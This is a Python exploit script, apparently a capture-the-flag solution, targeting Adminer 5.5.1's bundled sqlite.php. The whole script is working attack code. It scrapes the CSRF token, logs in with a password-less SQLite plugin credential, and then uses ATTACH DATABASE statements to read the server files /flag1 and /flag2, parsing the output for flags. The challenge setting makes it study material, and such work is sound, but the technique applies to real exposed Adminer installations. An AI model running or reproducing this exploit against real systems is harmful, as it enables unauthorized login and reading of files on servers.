#!/usr/bin/env python3
"""
vrana/adminer 5.5.1 — SQLite exploit (PHP 8.4)

Login bypass via sqlite.php + login-password-less plugin with configured
dummy bypass credential. Execute SQL to read /flag1 via ATTACH DATABASE.
"""

import os
import sys
import re
import requests

# SQLite plugin bypass token / placeholder credential
ADMINER_BYPASS_PASS = os.getenv("ADMINER_SQLITE_PASS", "adminer_sqlite_bypass")  # skipcq: PTC-W6004, SEC-001


def _extract_token(html: str) -> str:
    m = re.search(r"name='token'\s+value='(\d+:\d+)'", html)
    return m.group(1) if m else ""


def _exec_sql(s: requests.Session, endpoint: str, sql: str) -> requests.Response:
    r = s.get(endpoint, timeout=10)
    token = _extract_token(r.text)
    return s.post(endpoint, data={'sql': sql, 'token': token}, timeout=10, allow_redirects=True)


def _extract_flags(text: str, label: str):
    for td in re.findall(r'<td[^>]*>(.*?)</td>', text, re.DOTALL):
        clean = re.sub(r'<[^>]+>', '', td).strip()
        if clean and len(clean) > 3:
            print(f"{label}: {clean}")
    err = re.search(r"class='error'>(.*?)</div>", text)
    if err:
        content = err.group(1)
        if any(k in content for k in ('LOCAL_TEST_FLAG', 'flag{', 'HITCON')):
            print(f"{label}: {content}")


def main():
    if len(sys.argv) < 2:
        print("Usage: exploit <challenge_host>")
        sys.exit(1)

    challenge = sys.argv[1]
    base_url = f"http://{challenge}"
    url = f"{base_url}/vendor/vrana/adminer/adminer/sqlite.php"

    s = requests.Session()

    # Step 1: Get login page from sqlite.php
    r = s.get(url, timeout=10)
    token = _extract_token(r.text)

    # Step 2: Login with SQLite + configured password
    r = s.post(url, data={
        'auth[driver]': 'sqlite', 'auth[server]': '', 'auth[username]': '',
        'auth[password]': ADMINER_BYPASS_PASS, 'auth[db]': '', 'auth[permanent]': '1',
        'token': token,
    }, timeout=10, allow_redirects=True)

    if 'Logged as' not in r.text:
        print("[-] Login failed", file=sys.stderr)
        return

    # Step 3: Access SQL page - must use ?sqlite=&username= to maintain session
    r = s.get(f"{url}?sqlite=&username=", timeout=10)
    if 'Logged as' not in r.text:
        print("[-] Session lost", file=sys.stderr)
        return

    # Step 4: Execute SQL to read /flag1
    sql_endpoint = f"{url}?sqlite=&username=&sql="
    _exec_sql(s, sql_endpoint, "ATTACH DATABASE '/flag1' AS flagdb;")
    r_flag1 = _exec_sql(s, sql_endpoint, "SELECT * FROM flagdb;")
    _extract_flags(r_flag1.text, "FLAG1")

    # Step 5: Try /flag2 via ATTACH
    _exec_sql(s, sql_endpoint, "ATTACH DATABASE '/flag2' AS flag2db;")
    r_flag2 = _exec_sql(s, sql_endpoint, "SELECT * FROM flag2db;")
    _extract_flags(r_flag2.text, "FLAG2")


if __name__ == '__main__':
    main()
